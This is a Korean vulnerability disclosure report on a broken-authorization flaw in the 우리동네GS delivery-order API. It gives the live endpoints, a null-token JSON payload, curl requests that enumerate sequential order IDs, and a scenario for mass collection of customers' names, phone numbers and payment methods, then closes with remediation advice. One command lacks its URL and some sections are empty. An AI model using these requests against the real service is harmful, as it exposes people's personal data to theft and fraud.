# [불충분한 인가] 배달 주문 조회 API 인증 미적용으로 타인 개인정보(전화번호, 이름, 결제수단) 무단 열람

## 범위
[Website] 우리동네GS - *.woodongs.com/*
## 발견 위치
https://b2c-apigw.woodongs.com/payment/refrigerator/rest/gsr/mc2/wdlvyOrder/retrieveWdlvyOrdDtl
### Attack Point
ordId (주문 식별자 — 14자리 순차 증가 정수), accessToken (서버가 null 허용)
### Payload
{"accessToken":null,"userId":null,"custNo":null,"ordId":"20260517724500"}
## 공격 유형
불충분한 인가
## 공격 영향

## 취약점 설명 및 조치 방안
### 취약점 설명
우리동네GS 결제 게이트웨이(`b2c-apigw.woodongs.com`)의 배달 주문 조회 엔드포인트는 인증 토큰 검증을 수행하지 않는다.

공격자는 `accessToken`을 null로 설정하고, 14자리 순차 증가 숫자로 구성된 `ordId`를 열거하여 다른 사용자의 주문 상세 정보를 무인증 상태에서 조회할 수 있다.

---

### 취약점 상세 설명
#### 취약점 발견 방법
우리동네GS 결제 서버의 공개 인터페이스 명세(`/payment/v3/api-docs`)를 통해 엔드포인트 목록을 확인하고, 인증 토큰 없이 각 엔드포인트에 요청을 전송하여 응답을 분석하였다.

배달 주문 관련 엔드포인트(`/payment/refrigerator/rest/gsr/mc2/wdlvyOrder/*`)가 `accessToken=null` 요청에 대해 인증 오류(401) 대신 정상 처리 응답(200)을 반환함을 확인하였다.

#### 취약점 발생 원인
- **인증 미적용**: 서버가 `accessToken` 필드가 null이거나 비어 있어도 요청을 정상 처리한다.
- **순차 증가 주문 식별자**: `ordId`가 `YYYYMMDD` + 6자리 순차 카운터로 구성되어 있어 유효한 주문 번호를 예측하여 열거할 수 있다.

#### 취약점 증명 / 검증

**1단계: 대조군 확인 — 인증이 작동하는 엔드포인트**

동일 서버에서 인증이 정상 작동하는 엔드포인트(`/payment/thepop/api/wdlvy/retrieveWdlvyDownloadCpnNo`)에 동일한 null 토큰 요청을 전송하면 401 오류가 반환된다.

```bash
curl -s -X POST "https://b2c-apigw.woodongs.com/payment/thepop/api/wdlvy/retrieveWdlvyDownloadCpnNo" </span>
  -H "Content-Type: application/json" </span>
  -H "User-Agent: Dart/3.0 (dart:io)" </span>
  -d '{"accessToken":null,"ssoAuthToken":null}'
# → 401 {"resultCd":"9006","resultMsg":"토큰이 유효하지 않습니다."}
```

**2단계: 주문 식별자 형식 파악**

`retrieveWdlvyOrdId` 엔드포인트도 인증 없이 신규 주문 식별자를 발급하여 형식을 확인하였다.

```bash
curl -s -X POST "https://b2c-apigw.woodongs.com/payment/refrigerator/rest/gsr/mc2/wdlvyOrder/retrieveWdlvyOrdId" </span>
  -H "Content-Type: application/json" </span>
  -H "User-Agent: Dart/3.0 (dart:io)" </span>
  -d '{"accessToken":null,"strCd":"001","ordTypeCd":"1"}'
```

응답:
```json
{"header":{"procRsltCd":0,"procRsltDesc":"정상적으로 조회 되었습니다."},
 "body":{"procRsltVal":{"ordId":"20260517725128"}}}
```

형식: `20260517725128` = `20260517`(날짜) + `725128`(순차 카운터)

순차성 확인: 연속 호출 시 `725129`, `725130`으로 1씩 증가.

**3단계: 타인 주문 정보 무단 조회**

순차 카운터 탐색을 통해 실제 주문이 존재하는 식별자를 확인하고, 인증 없이 해당 주문의 상세 정보를 조회하였다.

```bash

  -H "Content-Type: application/json" </span>
  -H "User-Agent: Dart/3.0 (dart:io)" </span>
  -d '{"accessToken":null,"userId":null,"custNo":null,"ordId":"20260517724647"}'
```

노출된 정보:

#### 취약점 악용 시나리오
1. 공격자가 오늘 날짜 기준 `YYYYMMDD`를 앞에 붙이고 6자리 카운터를 순차 열거한다.
2. 유효한 주문이 존재하는 식별자에서 200 응답과 함께 주문자 전화번호, 이름, 결제수단이 반환된다.
3. 인증 없이 불특정 다수 우리동네GS 배달 서비스 이용자의 개인정보를 대량으로 수집할 수 있다.
4. 수집된 전화번호와 이름은 스팸·사기 문자, 보이스피싱 등 2차 피해에 악용될 수 있다.

### 기타

- 동일 엔드포인트 그룹에서 배달 서비스 시간 조회(`retrieveWdlvySvcTm`), 신규 주문 식별자 발급(`retrieveWdlvyOrdId`) 등 3개 이상의 엔드포인트가 동일한 인증 미적용 취약점을 가짐.
- 참고 표준: CWE-306 (Missing Authentication for Critical Function), CWE-639 (Authorization Bypass Through User-Controlled Key)

## 조치 방안
모든 `/payment/refrigerator/rest/gsr/mc2/wdlvyOrder/*` 엔드포인트에서 `accessToken`의 유효성을 서버 측에서 반드시 검증하여야 한다. 유효하지 않거나 null인 토큰에 대해 401 오류를 반환하도록 인증 미들웨어를 적용하여야 한다. 추가로 `ordId`를 무작위 값(서명된 토큰 또는 UUID 기반)으로 변경하고, 조회 시 토큰의 소유자와 주문 소유자가 일치하는지 서버에서 검증하여야 한다.
